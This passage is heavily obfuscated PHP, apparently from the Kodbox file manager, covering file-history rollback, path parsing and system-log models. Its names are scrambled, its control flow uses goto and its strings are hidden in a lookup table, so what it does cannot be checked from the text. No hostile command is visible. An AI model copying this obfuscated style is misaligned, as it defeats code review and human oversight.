return self::saveData($cÚª·›ä·[$f” š†“²[1089]], array()); } public static function moveHistory($cÙ‰Éğ¸“¶, $få½£¢šğİ = '', $eÜ›¼ªë¯È = '') { goto c”¹Öè¯æ¸; aÌºÇÊ£Ä: $FÙØ·³±Ë = substr(get_path_this($f÷¤›‹…öÊ[$fÕ‰£ïó‡[1089]]), 0, -strlen($DÍ¢òÈĞÛï)); foreach ($f÷¤›‹…öÊ[$fÕ‰£ïó‡[361]] as $bÏÊæŞæ‰ => $CîËˆ‰îÎÍ) { $fÃğ İëË = $få½£¢šğİ . substr($CîËˆ‰îÎÍ[$fÕ‰£ïó‡[28]], strlen($FÙØ·³±Ë)); $F¾ë¨”ç„ = IO::move($f÷¤›‹…öÊ[$fÕ‰£ïó‡[1088]] . $CîËˆ‰îÎÍ[$fÕ‰£ïó‡[28]], $eÜ›¼ªë¯È, !1, $fÃğ İëË); if ($F¾ë¨”ç„) { $f÷¤›‹…öÊ[$fÕ‰£ïó‡[361]][$bÏÊæŞæ‰][$fÕ‰£ïó‡[28]] = $fÃğ İëË; } } $f÷¤›‹…öÊ[$fÕ‰£ïó‡[1089]] = IO::move($f÷¤›‹…öÊ[$fÕ‰£ïó‡[1089]], $eÜ›¼ªë¯È, !1, $få½£¢šğİ . $DÍ¢òÈĞÛï); goto eÇãò·ëïÖ; eÇãò·ëïÖ: self::saveData($f÷¤›‹…öÊ[$fÕ‰£ïó‡[1089]], $f÷¤›‹…öÊ[$fÕ‰£ïó‡[361]]); self::clearEmptyFolder($f÷¤›‹…öÊ[$fÕ‰£ïó‡[1088]]); goto dğàáİéŞå; açˆŠã: $DÍ¢òÈĞÛï = $fÕ‰£ïó‡[1076]; $få½£¢šğİ = $få½£¢šğİ ? $få½£¢šğİ : get_path_this($cÙ‰Éğ¸“¶); $eÜ›¼ªë¯È = $eÜ›¼ªë¯È ? $eÜ›¼ªë¯È : $f÷¤›‹…öÊ[$fÕ‰£ïó‡[1088]]; goto aÌºÇÊ£Ä; c”¹Öè¯æ¸: $fÕ‰£ïó‡ =& $_SERVER[úÎü]; $f÷¤›‹…öÊ = self::listData($cÙ‰Éğ¸“¶, !1); if (!$f÷¤›‹…öÊ || !$f÷¤›‹…öÊ[$fÕ‰£ïó‡[361]]) { return !1; } goto açˆŠã; dğàáİéŞå: } public static function rollback($A„ßĞ— ±, $Bß‚¿øÑ‘‡) { $b‡à¡­—ÔŠ =& $_SERVER[úÎü]; $d†®«­·ó¦ = self::listData($A„ßĞ— ±); if (!$d†®«­·ó¦) { return; } $cÊ¤ÛË”ÛŠ = IO::info($A„ßĞ— ±); foreach ($d†®«­·ó¦[$b‡à¡­—ÔŠ[361]] as $c¼ÊÀôİ– => $Aš±ÂÉ¥Û) { if ($Aš±ÂÉ¥Û[$b‡à¡­—ÔŠ[383]] == $Bß‚¿øÑ‘‡) { self::add($A„ßĞ— ±); $f¬°İµ˜’Ú = $d†®«­·ó¦[$b‡à¡­—ÔŠ[1088]] . $Aš±ÂÉ¥Û[$b‡à¡­—ÔŠ[28]]; $D¹…èÇÄöº = IO::copy($f¬°İµ˜’Ú, IO::pathFather($A„ßĞ— ±), REPEAT_REPLACE, $cÊ¤ÛË”ÛŠ[$b‡à¡­—ÔŠ[28]]); if ($D¹…èÇÄöº) { self::remove($A„ßĞ— ±, $Bß‚¿øÑ‘‡); } return $D¹…èÇÄöº; } } return !1; } public static function setDetail($eŒç°³ôí, $aÎé‡ø®‰, $A‹•²Â…š…) { $fÉÉ•Ä¼ï‘ =& $_SERVER[úÎü]; $d•ŸÈÔãğ = self::listData($eŒç°³ôí); if (!$d•ŸÈÔãğ) { return; } foreach ($d•ŸÈÔãğ[$fÉÉ•Ä¼ï‘[361]] as $FóÑÖ¬‚«• => $aà³Û„“©ä) { if ($aà³Û„“©ä[$fÉÉ•Ä¼ï‘[383]] == $aÎé‡ø®‰) { $d•ŸÈÔãğ[$fÉÉ•Ä¼ï‘[361]][$FóÑÖ¬‚«•][$fÉÉ•Ä¼ï‘[1087]] = $A‹•²Â…š…; self::saveData($d•ŸÈÔãğ[$fÉÉ•Ä¼ï‘[1089]], $d•ŸÈÔãğ[$fÉÉ•Ä¼ï‘[361]]); return !0; } } return !1; } public static function fileInfo($Eª‹®‘Ö¯é, $EÈïˆ«Ù) { goto b‘´Ù´ÅÅ; D¯åëš®Õƒ: $e¯Ú¨®‘•Ù = $BœÎÃêÁ¥[33]; foreach ($b‰ôÎĞƒÖŠ[$BœÎÃêÁ¥[361]] as $BÏë¶øà¹¯ => $c‘‘Šˆ®Á·) { if ($c‘‘Šˆ®Á·[$BœÎÃêÁ¥[383]] != $EÈïˆ«Ù) { continue; } $e¯Ú¨®‘•Ù = $b‰ôÎĞƒÖŠ[$BœÎÃêÁ¥[1088]] . $c‘‘Šˆ®Á·[$BœÎÃêÁ¥[28]]; break; } if (!$e¯Ú¨®‘•Ù) { show_json(LNG($BœÎÃêÁ¥[101]), !1); } goto aæ´‡‚÷Ÿ; b‘´Ù´ÅÅ: $BœÎÃêÁ¥ =& $_SERVER[úÎü]; $b‰ôÎĞƒÖŠ = self::listData($Eª‹®‘Ö¯é); if (!$b‰ôÎĞƒÖŠ) { show_json(LNG($BœÎÃêÁ¥[101]), !1); } goto D¯åëš®Õƒ; aæ´‡‚÷Ÿ: return IO::info($e¯Ú¨®‘•Ù); goto B°Ô¨Ü‰‘; B°Ô¨Ü‰‘: } public static function fileOut($Aâ¹Ë‚¶–Š, $BƒË°×·Œ, $eğŸ­Şµà = false) { $c©Ã®‰Ğì¼ =& $_SERVER[úÎü]; $dº®ç³Ï™¥ = self::fileInfo($Aâ¹Ë‚¶–Š, $BƒË°×·Œ); $FÆ×Ãì˜®† =& $GLOBALS[$c©Ã®‰Ğì¼[7]]; $eğŸ­Şµà = isset($FÆ×Ãì˜®†[$c©Ã®‰Ğì¼[1054]]) && $FÆ×Ãì˜®†[$c©Ã®‰Ğì¼[1054]] == 1; if (isset($FÆ×Ãì˜®†[$c©Ã®‰Ğì¼[29]]) && $FÆ×Ãì˜®†[$c©Ã®‰Ğì¼[29]] == $c©Ã®‰Ğì¼[1090]) { return IO::fileOutImage($dº®ç³Ï™¥[$c©Ã®‰Ğì¼[75]], $FÆ×Ãì˜®†[$c©Ã®‰Ğì¼[1091]]); } IO::fileOut($dº®ç³Ï™¥[$c©Ã®‰Ğì¼[75]], $eğŸ­Şµà, get_path_this($Aâ¹Ë‚¶–Š)); } public static function listData($EøÍà¥––Í, $dèÔ¼ö©×¢ = true) { goto F£áè’–…; F£áè’–…: $C„Èæ’¯î‹ =& $_SERVER[úÎü]; if ($dèÔ¼ö©×¢ && !IO::exist($EøÍà¥––Í)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto b…‰­Â×Â; FŒ‡ö×Í•: $B À×¯Öª° = IO::getContent($B‡¡ŠÆŒÚÒ[$C„Èæ’¯î‹[1089]]); if ($B À×¯Öª°) { $F‰Ëë·¢ï = json_decode($B À×¯Öª°, !0); if (is_array($F‰Ëë·¢ï)) { $B‡¡ŠÆŒÚÒ[$C„Èæ’¯î‹[361]] = $F‰Ëë·¢ï; } } return $B‡¡ŠÆŒÚÒ; goto cì…âŒ…³; b…‰­Â×Â: if (substr($EøÍà¥––Í, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $CòÂ­šÅ = self::pathHistory($EøÍà¥––Í); $B‡¡ŠÆŒÚÒ = array($C„Èæ’¯î‹[1089] => $CòÂ­šÅ . $C„Èæ’¯î‹[1076], $C„Èæ’¯î‹[1088] => rtrim(get_path_father($CòÂ­šÅ), $C„Èæ’¯î‹[8]) . $C„Èæ’¯î‹[8], $C„Èæ’¯î‹[361] => array()); goto FŒ‡ö×Í•; cì…âŒ…³: } private static function saveData($a»ìëåÄÍ¾, $AõÆ‹âİÉ) { goto b¡„›Ó†Û; b¡„›Ó†Û: $aÆÕâ¬™Õñ =& $_SERVER[úÎü]; self::log($aÆÕâ¬™Õñ[1092] . $a»ìëåÄÍ¾ . $aÆÕâ¬™Õñ[67] . count($AõÆ‹âİÉ), $aÆÕâ¬™Õñ[692]); if ($AõÆ‹âİÉ) { return IO::setContent($a»ìëåÄÍ¾, json_encode($AõÆ‹âİÉ)); } goto fÌ‘¶àÙ; fÌ‘¶àÙ: $fì‡ÏŒ×ä = IO::pathFather($a»ìëåÄÍ¾); IO::remove($a»ìëåÄÍ¾); self::clearEmptyFolder($fì‡ÏŒ×ä); goto bóÜ¼ÌğÕ; bóÜ¼ÌğÕ: return !0; goto b³¢²À‘æ‚; b³¢²À‘æ‚: } public static function clearEmptyFolder($C’²Ë‘“é) { goto C™Ó‘œ×—Ñ; C×Ô¡‹êÈ¡: self::clearEmptyFolder($bßöôÈ‡Â©); goto d„Îˆçëè; cİ­ò¸ôùÈ: $eÎÕ±¥›´˜ = IO::has($C’²Ë‘“é, !0); if ($eÎÕ±¥›´˜[$fİ­ñá„°[199]] > 0 || $eÎÕ±¥›´˜[$fİ­ñá„°[200]] > 0) { return; } IO::remove($C’²Ë‘“é); goto C×Ô¡‹êÈ¡; C™Ó‘œ×—Ñ: $fİ­ñá„° =& $_SERVER[úÎü]; if (trim($C’²Ë‘“é, $fİ­ñá„°[8]) == trim(self::$_historyBase, $fİ­ñá„°[8])) { return; } $bßöôÈ‡Â© = IO::pathFather($C’²Ë‘“é); goto cİ­ò¸ôùÈ; d„Îˆçëè: } private static function getBasePath() { goto Eí˜Î»ÏÙ‰; b·»Ø«•î: $f´Ù¥Û¾î = DATA_PATH . $D¤êĞŸãâŞ[1095]; $f´Ù¥Û¾î = IO::mkdir($f´Ù¥Û¾î); $f´Ù¥Û¾î = rtrim($f´Ù¥Û¾î, $D¤êĞŸãâŞ[8]) . $D¤êĞŸãâŞ[8]; goto D¸İŞÛ‰‡¦; Eí˜Î»ÏÙ‰: $D¤êĞŸãâŞ =& $_SERVER[úÎü]; $f´Ù¥Û¾î = Model($D¤êĞŸãâŞ[1093])->get($D¤êĞŸãâŞ[1094]); if (IO::exist($f´Ù¥Û¾î)) { return $f´Ù¥Û¾î; } goto b·»Ø«•î; D¸İŞÛ‰‡¦: file_put_contents($f´Ù¥Û¾î . $D¤êĞŸãâŞ[1096], $D¤êĞŸãâŞ[33]); Model($D¤êĞŸãâŞ[1093])->set($D¤êĞŸãâŞ[1094], $f´Ù¥Û¾î); return $f´Ù¥Û¾î; goto B‰œ‚º°†Ê; B‰œ‚º°†Ê: } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\x52\x65\143\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\x46\151\154\145\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\x46\x69\154\x65\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\160\122\x6f\157\164\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\150\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\123\150\141\x72\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\124\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\x65\x49\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\145\x49\x74\145\x6d\x4c\151\x6e\153\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\150\175"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\x6e\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\145\162\175"; public static function typeList() { $FğÍ¨È =& $_SERVER[úÎü]; return array($FğÍ¨È[1097] => self::KOD_SOURCE, $FğÍ¨È[1098] => self::KOD_USER_RECYCLE, $FğÍ¨È[1099] => self::KOD_USER_FAV, $FğÍ¨È[1100] => self::KOD_USER_FILE_TAG, $FğÍ¨È[1101] => self::KOD_USER_FILE_TYPE, $FğÍ¨È[1102] => self::KOD_GROUP_ROOT_SELF, $FğÍ¨È[1103] => self::KOD_USER_SHARE, $FğÍ¨È[1104] => self::KOD_USER_SHARE_LINK, $FğÍ¨È[1105] => self::KOD_USER_SHARE_TO_ME, $FğÍ¨È[1106] => self::KOD_SHARE_ITEM, $FğÍ¨È[1107] => self::KOD_SHARE_LINK, $FğÍ¨È[1108] => self::KOD_SEARCH, $FğÍ¨È[1109] => self::KOD_BLOCK, $FğÍ¨È[1110] => self::KOD_IO, $FğÍ¨È[1111] => self::KOD_USER_RECENT, $FğÍ¨È[1112] => self::KOD_USER_DRIVER); } public static function parse($fØÒÍÅ‰ Ö) { goto bÅÚÁÜé; aƒ¡åô¨™: preg_match($aŸè‘İÃ­ª[1113], $fØÒÍÅ‰ Ö, $D¥ƒèª÷Ä–); $FÜÉ—œ¦ = array($aŸè‘İÃ­ª[404] => !1, $aŸè‘İÃ­ª[1114] => !1, $aŸè‘İÃ­ª[401] => !1, $aŸè‘İÃ­ª[75] => $fØÒÍÅ‰ Ö, $aŸè‘İÃ­ª[1025] => !1, $aŸè‘İÃ­ª[1024] => $aŸè‘İÃ­ª[33]); if (is_array($D¥ƒèª÷Ä–) && count($D¥ƒèª÷Ä–) == 5) { $cŒ³…¿ÊÉ¶ = $aŸè‘İÃ­ª[1115] . $D¥ƒèª÷Ä–[2] . $aŸè‘İÃ­ª[321]; if (in_array($cŒ³…¿ÊÉ¶, $CÇ˜ÌİáÍ)) { $FÜÉ—œ¦[$aŸè‘İÃ­ª[1025]] = $D¥ƒèª÷Ä–[1]; $FÜÉ—œ¦[$aŸè‘İÃ­ª[29]] = $cŒ³…¿ÊÉ¶; $FÜÉ—œ¦[$aŸè‘İÃ­ª[1116]] = substr($cŒ³…¿ÊÉ¶, 1, -1); $FÜÉ—œ¦[$aŸè‘İÃ­ª[383]] = $D¥ƒèª÷Ä–[3]; } $FÜÉ—œ¦[$aŸè‘İÃ­ª[1024]] = $D¥ƒèª÷Ä–[4]; } goto F–‡‡›¯; F–‡‡›¯: $a…­¤À¦« = array($aŸè‘İÃ­ª[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $FÜÉ—œ¦[$aŸè‘İÃ­ª[1078]] = in_array($FÜÉ—œ¦[$aŸè‘İÃ­ª[29]], $a…­¤À¦«); return $FÜÉ—œ¦; goto FÃ¸Ù×Ü§; bÅÚÁÜé: $aŸè‘İÃ­ª =& $_SERVER[úÎü]; $fØÒÍÅ‰ Ö = self::clear($fØÒÍÅ‰ Ö); $CÇ˜ÌİáÍ = array_values(self::typeList()); goto aƒ¡åô¨™; FÃ¸Ù×Ü§: } public static function clear($DÊËÊ†—‚İ) { goto E¾µÓÑ­ÔÇ; B…Ü‘ßœò: $DÊËÊ†—‚İ = preg_replace($BƒÀ—ø™Â‰[1119], $BƒÀ—ø™Â‰[8], $DÊËÊ†—‚İ); if ($DÊËÊ†—‚İ == $BƒÀ—ø™Â‰[8]) { return $BƒÀ—ø™Â‰[8]; } $DÊËÊ†—‚İ = rtrim($DÊËÊ†—‚İ, $BƒÀ—ø™Â‰[8]); goto a’Èò›; E¾µÓÑ­ÔÇ: $BƒÀ—ø™Â‰ =& $_SERVER[úÎü]; $DÊËÊ†—‚İ = str_replace(array($BƒÀ—ø™Â‰[998], $BƒÀ—ø™Â‰[225]), $BƒÀ—ø™Â‰[50], $DÊËÊ†—‚İ); $DÊËÊ†—‚İ = str_replace($BƒÀ—ø™Â‰[93], $BƒÀ—ø™Â‰[8], $DÊËÊ†—‚İ); goto CŸÛåÁ®Ã; CŸÛåÁ®Ã: $BÒÌ‹îä¼› = $BƒÀ—ø™Â‰[1117]; if (substr($DÊËÊ†—‚İ, 0, 3) == $BƒÀ—ø™Â‰[1118]) { $DÊËÊ†—‚İ = substr($DÊËÊ†—‚İ, 3); } while (strstr($DÊËÊ†—‚İ, $BÒÌ‹îä¼›)) { $DÊËÊ†—‚İ = str_replace($BÒÌ‹îä¼›, $BƒÀ—ø™Â‰[8], $DÊËÊ†—‚İ); } goto B…Ü‘ßœò; a’Èò›: return $DÊËÊ†—‚İ; goto CÂÏµâçˆ˜; CÂÏµâçˆ˜: } public static function sourceID($d×©…†ÓÆ–) { $aÔºÉô”ª¶ =& $_SERVER[úÎü]; $CŠÄêİÏ = self::parse($d×©…†ÓÆ–); if ($CŠÄêİÏ[$aÔºÉô”ª¶[29]] !== self::KOD_SOURCE) { show_json(LNG($aÔºÉô”ª¶[1120]), !1); } return $CŠÄêİÏ[$aÔºÉô”ª¶[383]]; } public static function make($eò°ùËç¹ò) { if (!$eò°ùËç¹ò) { return !1; } return self::makePath(self::KOD_SOURCE, intval($eò°ùËç¹ò)); } public static function makeShare($C‡©ÁÀå­, $BÂ¦‡¤í³œ) { return self::makePath(self::KOD_SHARE_ITEM, $C‡©ÁÀå­, $BÂ¦‡¤í³œ); } public static function makeFileTypePath($dùÕèË £«) { return self::makePath(self::KOD_USER_FILE_TYPE, $dùÕèË £«); } public static function makeFileTagPath($e¯‡½Ö…å) { return self::makePath(self::KOD_USER_FILE_TAG, $e¯‡½Ö…å); } public static function makePath($b÷Î‡ÕìÚä, $d¬¿±ñÆÒ = '', $DŠ ßìïŞ¼ = '') { $cÀ–‰’›• =& $_SERVER[úÎü]; $A¶ÔÓÁ´Ğ· = substr($b÷Î‡ÕìÚä, 1, -1); $C“Ï®‰È = $cÀ–‰’›•[1121] . $A¶ÔÓÁ´Ğ· . $cÀ–‰’›•[1122] . $d¬¿±ñÆÒ . $cÀ–‰’›•[1123]; $C“Ï®‰È = $DŠ ßìïŞ¼ ? $C“Ï®‰È . $DŠ ßìïŞ¼ . $cÀ–‰’›•[8] : $C“Ï®‰È; return $C“Ï®‰È; } public static function hashPath($fÜŒš…¾ÁÏ) { $Aˆ»æ­çªÚ =& $_SERVER[úÎü]; $e–½—é‚ßë = is_array($fÜŒš…¾ÁÏ) ? $fÜŒš…¾ÁÏ : IO::info($fÜŒš…¾ÁÏ); $bğ¢Æâ…”¹ = _get($e–½—é‚ßë, $Aˆ»æ­çªÚ[1124], $Aˆ»æ­çªÚ[33]); if (!$bğ¢Æâ…”¹) { $BœÚøá­å = KodIO::parse($e–½—é‚ßë[$Aˆ»æ­çªÚ[75]]); if (!$BœÚøá­å[$Aˆ»æ­çªÚ[29]]) { $bğ¢Æâ…”¹ = IO::hashSimple($e–½—é‚ßë[$Aˆ»æ­çªÚ[75]]); } } if (!$bğ¢Æâ…”¹) { $bğ¢Æâ…”¹ = md5($e–½—é‚ßë[$Aˆ»æ­çªÚ[75]] . $e–½—é‚ßë[$Aˆ»æ­çªÚ[77]] . $e–½—é‚ßë[$Aˆ»æ­çªÚ[107]]); } return $bğ¢Æâ…”¹; } public static function initSystemPath() { goto Bİ…íô½Ş¾; Eí³‰Ä†øß: define($féÍ¶éÂ›½[1127], self::systemPath($féÍ¶éÂ›½[1128])); define($féÍ¶éÂ›½[1129], self::systemPath($féÍ¶éÂ›½[1130])); define($féÍ¶éÂ›½[1131], self::systemPath($féÍ¶éÂ›½[1132])); goto cÛ×ÈÚ¦Ç; Bİ…íô½Ş¾: $féÍ¶éÂ›½ =& $_SERVER[úÎü]; if (defined($féÍ¶éÂ›½[1125])) { return; } define($féÍ¶éÂ›½[1125], self::systemPath($féÍ¶éÂ›½[1126])); goto Eí³‰Ä†øß; cÛ×ÈÚ¦Ç: IOHistory::bindEvent(); goto C¨œ¼­À ; C¨œ¼­À : } public static function systemPath($d¥–„Üàã) { goto CÍã¾¿¨õÌ; CÍã¾¿¨õÌ: $BçÔÁèƒÑ• =& $_SERVER[úÎü]; $D¿¬—äÎñİ = $BçÔÁèƒÑ•[1133] . ucfirst($d¥–„Üàã); $AàĞêÊŒì© = Model($BçÔÁèƒÑ•[1083])->get($D¿¬—äÎñİ); goto aïŞ»„Ÿæ; C…ÄÀŒ¥±Á: return $AàĞêÊŒì©; goto BƒÁ–ÆäÔ¤; aïŞ»„Ÿæ: if ($AàĞêÊŒì©) { return $AàĞêÊŒì©; } if ($d¥–„Üàã == $BçÔÁèƒÑ•[1126]) { $AàĞêÊŒì© = self::make(Model($BçÔÁèƒÑ•[752])->systemRootPathAdd($BçÔÁèƒÑ•[1134])); } else { $AàĞêÊŒì© = self::systemPath($BçÔÁèƒÑ•[1126]); $Eê˜™‡ë¢‘ = self::sourceID($AàĞêÊŒì©); $AàĞêÊŒì© = self::make(Model($BçÔÁèƒÑ•[752])->mkdir($Eê˜™‡ë¢‘, $d¥–„Üàã)); } Model($BçÔÁèƒÑ•[1083])->set($D¿¬—äÎñİ, $AàĞêÊŒì©); goto C…ÄÀŒ¥±Á; BƒÁ–ÆäÔ¤: } public static function systemFolder($AŠé‚çËß®) { $DÜğ¨éàŞ = IO_PATH_SYSTEM_SOURCE . $AŠé‚çËß®; $DªÑÛğæ¹¥ = Cache::get($DÜğ¨éàŞ); if (!$DªÑÛğæ¹¥) { $C½ï°ÎíŠí = IO::infoFull($DÜğ¨éàŞ); if (!$C½ï°ÎíŠí) { $DªÑÛğæ¹¥ = IO::mkdir($DÜğ¨éàŞ, REPEAT_SKIP); } else { $DªÑÛğæ¹¥ = $C½ï°ÎíŠí[$_SERVER[úÎü][75]]; } Cache::set($DÜğ¨éàŞ, $DªÑÛğæ¹¥, 3600 * 10); } return $DªÑÛğæ¹¥; } public static function defaultDriver() { return Model($_SERVER[úÎü][704])->defaultDriver(); } public static function defaultIO() { $bñ« ƒ˜Ææ =& $_SERVER[úÎü]; $fÙ»ª’ó¸ñ = self::defaultDriver(); return $bñ« ƒ˜Ææ[1135] . $fÙ»ª’ó¸ñ[$bñ« ƒ˜Ææ[383]] . $bñ« ƒ˜Ææ[1123]; } public static function defaultDriverInit() { static $C¨¯Ó“·¿ = false; if ($C¨¯Ó“·¿) { return $C¨¯Ó“·¿; } $C¨¯Ó“·¿ = IO::init(self::defaultIO()); return $C¨¯Ó“·¿; } public static function fileTypeList() { $FÅ‘·ù«½ =& $_SERVER[úÎü]; $A²½„¿½·› = $GLOBALS[$FÅ‘·ù«½[6]][$FÅ‘·ù«½[1136]]; foreach ($A²½„¿½·› as $cµ±ñª…› => $añÅ‰Ìï÷) { $A¡çµ‚Ã = $FÅ‘·ù«½[1137] . $cµ±ñª…›; $dŠË›ĞòÌ¡ = LNG($A¡çµ‚Ã); if ($A¡çµ‚Ã != $dŠË›ĞòÌ¡) { $A²½„¿½·›[$cµ±ñª…›][$FÅ‘·ù«½[28]] = $dŠË›ĞòÌ¡; } } return $A²½„¿½·›; } public static function transferType($BõÒ„—¬ö¾, $d†È¡Ãë¹«) { goto e¨Ë£Æç…Ù; e¨Ë£Æç…Ù: $dó­•³ùŒ =& $_SERVER[úÎü]; $CÚâ†õäøá = self::driverType($BõÒ„—¬ö¾); $Cë¦Ù‰…³Ç = self::driverType($d†È¡Ãë¹«); goto E†Â‚šéÅ²; f­Ê —ÒÚ: return $dó­•³ùŒ[1140]; goto B£ä¸ë«ß´; E†Â‚šéÅ²: if ($CÚâ†õäøá[$dó­•³ùŒ[29]] == $Cë¦Ù‰…³Ç[$dó­•³ùŒ[29]] && $CÚâ†õäøá[$dó­•³ùŒ[1138]] == $Cë¦Ù‰…³Ç[$dó­•³ùŒ[1138]]) { return $dó­•³ùŒ[1139]; } if ($CÚâ†õäøá[$dó­•³ùŒ[29]] == $dó­•³ùŒ[785] && $Cë¦Ù‰…³Ç[$dó­•³ùŒ[29]] == $dó­•³ùŒ[102]) { return $dó­•³ùŒ[1054]; } if ($CÚâ†õäøá[$dó­•³ùŒ[29]] == $dó­•³ùŒ[102] && $Cë¦Ù‰…³Ç[$dó­•³ùŒ[29]] == $dó­•³ùŒ[785]) { return $dó­•³ùŒ[103]; } goto f­Ê —ÒÚ; B£ä¸ë«ß´: } public static function driverType($A¢Ï±Ñ¾¡æ) { goto E˜‚ÇÃ×Ì™; eì¦»„é¦ : return array($B¬®òŒùæ[29] => $B¬®òŒùæ[785], $B¬®òŒùæ[1138] => $A¢Ï±Ñ¾¡æ->pathDriver, $B¬®òŒùæ[75] => $BÏÜ—…ÈäÛ); goto FµòÀ†Îª; FÀµÒË‘¸Î: if ($CôÈÙ½ô‘Ö == $B¬®òŒùæ[695] || $CôÈÙ½ô‘Ö == $B¬®òŒùæ[1142] || $CôÈÙ½ô‘Ö == $B¬®òŒùæ[1143]) { $A¢Ï±Ñ¾¡æ = self::defaultDriverInit(); } else { if ($CôÈÙ½ô‘Ö == $B¬®òŒùæ[1061] || $CôÈÙ½ô‘Ö == $B¬®òŒùæ[1144]) { $A¢Ï±Ñ¾¡æ = IO::init($A¢Ï±Ñ¾¡æ->pathParse[$B¬®òŒùæ[1008]]); } } $CôÈÙ½ô‘Ö = str_replace($B¬®òŒùæ[1141], $B¬®òŒùæ[33], strtolower($A¢Ï±Ñ¾¡æ->getType())); if ($CôÈÙ½ô‘Ö == $B¬®òŒùæ[102]) { return array($B¬®òŒùæ[29] => $B¬®òŒùæ[102], $B¬®òŒùæ[1138] => $B¬®òŒùæ[33], $B¬®òŒùæ[75] => $BÏÜ—…ÈäÛ); } goto eì¦»„é¦ ; E˜‚ÇÃ×Ì™: $B¬®òŒùæ =& $_SERVER[úÎü]; $BÏÜ—…ÈäÛ = $A¢Ï±Ñ¾¡æ->path; $CôÈÙ½ô‘Ö = str_replace($B¬®òŒùæ[1141], $B¬®òŒùæ[33], strtolower($A¢Ï±Ñ¾¡æ->getType())); goto FÀµÒË‘¸Î; FµòÀ†Îª: } } goto Fï”ÖËÆŠƒ; bÒ˜ê³: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\114\151\147\150\x74\101\x70\x70"; public $modelType = "\123\x79\x73\x74\x65\x6d\x4f\x70\164\x69\x6f\156"; public $field = array("\x6e\141\x6d\145", "\x67\162\157\x75\x70", "\144\x65\x73\143", "\143\x6f\x6e\164\x65\x6e\164"); public function listData($EŠÜ¼¿–â÷ = false, $cŒæÃ¦ß½å = "\x6d\157\144\151\146\171\124\151\155\145", $A™”­°çªƒ = true) { return parent::listData($EŠÜ¼¿–â÷, $cŒæÃ¦ß½å, $A™”­°çªƒ); } public function remove($cªÎèÒ«Õ‚) { $aŸïâêœØ¼ = $this->findByName($cªÎèÒ«Õ‚); if (!$aŸïâêœØ¼) { return !1; } return parent::remove($aŸïâêœØ¼[$_SERVER[úÎü][383]]); } public function add($e¿˜ï®îí¯) { if ($this->findByName($e¿˜ï®îí¯[$_SERVER[úÎü][28]])) { return !1; } return parent::insert($e¿˜ï®îí¯); } public function update($CÙ×àÃŠ‰, $d”•¿ŞğÒÁ) { $c¶Ü‚­’Ú =& $_SERVER[úÎü]; $cÓÕŠÃƒËÏ = $this->findByName($CÙ×àÃŠ‰); $B¼÷·²¹Ô = $this->findByName($d”•¿ŞğÒÁ[$c¶Ü‚­’Ú[28]]); if (!$cÓÕŠÃƒËÏ || $B¼÷·²¹Ô && $B¼÷·²¹Ô[$c¶Ü‚­’Ú[383]] != $cÓÕŠÃƒËÏ[$c¶Ü‚­’Ú[383]]) { return !1; } return parent::update($cÓÕŠÃƒËÏ[$c¶Ü‚­’Ú[383]], $d”•¿ŞğÒÁ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\x6d\137\x6c\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\145\x72\164", "\x66\x75\156\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $C³‚¤ŒÖã‡ =& $_SERVER[úÎü]; return array($C³‚¤ŒÖã‡[1955] => LNG($C³‚¤ŒÖã‡[1956]), $C³‚¤ŒÖã‡[1957] => LNG($C³‚¤ŒÖã‡[1958]), $C³‚¤ŒÖã‡[1583] => LNG($C³‚¤ŒÖã‡[1959]), $C³‚¤ŒÖã‡[1960] => LNG($C³‚¤ŒÖã‡[1961]), $C³‚¤ŒÖã‡[1962] => LNG($C³‚¤ŒÖã‡[1963]), $C³‚¤ŒÖã‡[1964] => LNG($C³‚¤ŒÖã‡[1965]), $C³‚¤ŒÖã‡[1966] => LNG($C³‚¤ŒÖã‡[1967]), $C³‚¤ŒÖã‡[1614] => LNG($C³‚¤ŒÖã‡[1967]), $C³‚¤ŒÖã‡[1615] => LNG($C³‚¤ŒÖã‡[1968]), $C³‚¤ŒÖã‡[1969] => LNG($C³‚¤ŒÖã‡[1970]), $C³‚¤ŒÖã‡[1971] => LNG($C³‚¤ŒÖã‡[1972]), $C³‚¤ŒÖã‡[1973] => LNG($C³‚¤ŒÖã‡[1974]), $C³‚¤ŒÖã‡[1975] => LNG($C³‚¤ŒÖã‡[1976]), $C³‚¤ŒÖã‡[1612] => LNG($C³‚¤ŒÖã‡[1977]), $C³‚¤ŒÖã‡[1619] => LNG($C³‚¤ŒÖã‡[1978]), $C³‚¤ŒÖã‡[1979] => LNG($C³‚¤ŒÖã‡[1980]), $C³‚¤ŒÖã‡[1981] => LNG($C³‚¤ŒÖã‡[1982]), $C³‚¤ŒÖã‡[1983] => LNG($C³‚¤ŒÖã‡[1984]), $C³‚¤ŒÖã‡[1985] => LNG($C³‚¤ŒÖã‡[1986]), $C³‚¤ŒÖã‡[1622] => 